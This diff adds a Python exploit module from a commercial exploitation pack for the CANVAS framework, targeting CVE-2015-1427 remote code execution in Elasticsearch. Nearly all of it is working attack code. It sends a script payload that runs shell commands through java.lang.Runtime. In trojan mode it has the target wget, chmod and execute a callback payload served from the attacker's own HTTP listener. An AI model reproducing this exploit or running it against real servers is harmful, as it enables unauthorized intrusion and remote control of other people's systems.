@@ -1,0 +1,232 @@
+#! /usr/bin/env python
+# -*- coding: utf-8 -*-
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2015
+#
+
+
+import sys, time, os, thread
+
+sys.path.append(".")
+sys.path.append("../../")
+
+import canvasengine
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+from MOSDEF import mosdef
+from libs.spkproxy import header, body
+from libs.canvasos import *
+import canvasengine
+import StringIO
+import urllib
+
+# GUI info
+NAME = "d2sec_elasticsearch"
+DESCRIPTION = "Elasticsearch RCE Vulnerability" 
+VERSION="1.0"
+
+DOCUMENTATION = {}
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION['References'] = "2015/01/31"
+DOCUMENTATION['Date public'] = ""
+DOCUMENTATION['Versions Affected'] = "< 1.3.8 and < 1.4.3"
+DOCUMENTATION["CVE Name"] = "CVE-2015-1427"
+DOCUMENTATION["Notes"] = ""
+
+PROPERTY={}
+PROPERTY['TYPE'] = "Web Exploits"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Linux"] ]
+
+
+class theexploit(tcpexploit):
+
+  def __init__(self):
+    tcpexploit.__init__(self)
+    self.TROJANMODE = 0
+    self.setInfo(DESCRIPTION)    
+    self.host = ''
+    self.name = NAME
+    self.trojanname = 'mosdef'
+    self.cmd = ''
+    self.port = 9200
+
+  ### Mosdef
+  def neededListenerTypes(self):
+    import canvasengine
+    return [canvasengine.UNIVERSAL_MOSDEF]
+
+  def maketrojan(self):
+    from libs.canvasos import canvasos
+    my_os = canvasos('Linux')
+    my_os.arch = 'X86'
+    self.log("[D2] Creating a callback to %s:%s"%(self.callback.ip, self.callback.port))
+    if not self.buildmosdeftrojan(self.callback.ip, self.callback.port, target_os=my_os, universal=True):
+      return 0 
+    file(self.trojanname, "wb").write(self.mosdeftrojan)
+    ret = len(self.mosdeftrojan) != 0
+    return ret
+
+  def makesploit(self, clientheader, clientbody):
+    h = header('SERVER')
+    b = body()
+    self.maketrojan()
+    if clientheader.URL.count(self.trojanname):
+      self.log("[D2] Sending MOSDEF trojan")
+      f = open(self.trojanname, "rb")
+      sploitstring = f.read()
+      f.close()
+      os.remove(self.trojanname)
+      self.log("[D2] Sending %d bytes"%len(sploitstring))
+      h.addHeader("Content-type","binary/octet-stream")
+      h.addHeader("Connection","close")
+      b.setBody(sploitstring)
+    return h, b
+
+  def listen(self):
+    s=self.gettcplistener(80, "0.0.0.0")
+    if not s:
+      self.log("[D2] Cannot listen on port 80 - perhaps that port is already bound?")
+      return 0
+    s.set_timeout(5)
+    self.s=s
+    return s
+
+  def accept(self, s=None ):
+    if s==None:
+      s=self.s
+    try:
+      infd,addr=s.accept()
+    except timeoutsocket.Timeout:
+      return
+    if infd==-1:
+      return
+    self.handle(infd)
+    return True
+
+  def handle(self, infd):
+    self.log("[D2] Handling connection")
+    clientheader = header(state = "SERVER")
+    clientheader.ssl = self.ssl
+    ret = clientheader.readdata(infd)
+    clientbody = body()
+    if clientheader.gotGoodHeader():
+      if clientheader.bodySize()>0 or clientheader.wasChunked:
+        self.log("[D2] Reading body")
+        clientbody.read(infd, clientheader.bodySize(), clientheader.wasChunked, 0)
+        self.log("[D2] Read body")
+    self.log("[D2] Creating exploit response")
+    servheader,servbody = self.makesploit(clientheader,clientbody)
+    self.log("[D2] Responding")
+    bodydata="".join(servbody.data)
+    response = ""
+    response += "%s %s %s\r\n"%(servheader.version, servheader.status, servheader.msg)
+    self.log(response)
+    for akey in servheader.headerValuesDict.keys():
+      if akey not in [ "Content-Length", "Content-length"]:
+        response += servheader.grabHeader(akey)
+    self.log("[D2] Sending header data of %d bytes"%len(response))
+    chunked=0
+    if not chunked:
+      response+="Content-Length: "+str(len(bodydata))+"\r\n"
+    response+="\r\n"
+    response+="".join(bodydata)
+    self.log("[D2] Total response length is %d bytes"%len(response))
+    try:
+      infd.sendall(response)
+    except socket.error:
+      self.log("[D2] Connection closed by peer")
+    self.log("[D2] Response sent")
+    infd.close()
+    return
+
+  def startHTTPServer(self):
+    s=self.listen()
+    if not s:
+      self.log("[D2] Failed to listen - not running")
+      return 0
+    while 1:
+      if self.state==self.HALT:
+        self.s.close()
+        break
+      self.accept()
+    self.setInfo("[D2] %s on %s:%d - done (success!)"%(NAME, self.bindip, self.port))
+    return 1
+
+  ### Elasticsearch
+  def _e_remote_exec(self, command):
+    payload = """{"size":1, "script_fields": {"lupin":{"script": "java.lang.Math.class.forName(\\"java.lang.Runtime\\").getRuntime().exec(\\"%s\\").getText()"}}}""" %(command)
+    try:
+      import json, requests
+      url = "http://%s:%d/_search?pretty" %(self.host, self.port)
+      r = requests.post(url=url, data=payload)
+    except Exception, e:
+      sys.exit("Exception Hit"+str(e))
+    values = json.loads(r.text)
+    json = values['hits']['hits'][0]['fields']['lupin'][0]
+    self.log(json)
+
+  def e_remote_exec(self):
+    if ';' in self.cmd:
+      commands = self.cmd.split(';')
+      for command in commands:
+        self.log('[D2] Execute \"%s\"' % command)
+        self._e_remote_exec(command)
+        time.sleep(5)
+    else:
+      self._e_remote_exec(self.cmd)
+      self.log('[D2] Execute \"%s\"' % self.cmd)
+
+  def getargs(self):
+    self.host = self.target.interface
+    self.port = int(self.argsDict.get("port",self.port))
+    if (self.argsDict.get("cmd", self.cmd) == ''):
+      self.TROJANMODE = 1
+      self.cmd = 'wget -O /tmp/%s %s/%s; chmod +x /tmp/%s; /tmp/%s' % (self.trojanname, self.callback.ip, self.trojanname, self.trojanname, self.trojanname)
+      thread.start_new_thread(self.startHTTPServer,())
+    else:
+      self.cmd = self.argsDict.get("cmd", self.cmd)
+
+  def run_exploit(self, widget):
+    self.getargs()
+    self.setInfo('[D2] %s attacking %s:%d' % (NAME, self.host, self.port))
+    self.log('[D2] %s attacking %s:%d' % (NAME, self.host, self.port))
+    time.sleep(5)
+    if (self.TROJANMODE == 1):
+      self.log('[D2] Create, download and execute Linux mosdef payload')
+      self.e_remote_exec()
+      if (self.TROJANMODE == 1):
+        while 1:
+          time.sleep(1)
+    self.log('[D2] %s attacking %s:%d - done' % (NAME,self.host,self.port))
+    self.setInfo('[D2] %s attacking %s:%d - done' % (NAME,self.host,self.port))
+    return 1
+
+  ### Module CANVAS
+  def run(self):
+    self.getargs()
+    self.setInfo('[D2] %s attacking %s:%d' % (NAME, self.host, self.port))
+    self.log('[D2] %s attacking %s:%d' % (NAME, self.host, self.port))
+    time.sleep(5)
+    if (self.TROJANMODE == 1):
+      self.log('[D2] Create, download and execute Linux mosdef payload')
+    self.e_remote_exec()
+    if (self.TROJANMODE == 1):
+      #self.log('[D2] %s attacking %s:%d - done' % (NAME,self.host,self.port))
+      #self.setInfo('[D2] %s attacking %s:%d - done' % (NAME,self.host,self.port))
+      while 1:
+        time.sleep(1)
+    self.log('[D2] %s attacking %s:%d - done' % (NAME,self.host,self.port))
+    self.setInfo('[D2] %s attacking %s:%d - done' % (NAME,self.host,self.port))
+    return 1
+
+if __name__ == "__main__":
+  print "Running CANVAS %s v %s" % (NAME,VERSION)
+  app = theexploit()
+  ret = standard_callback_commandline(app)
+
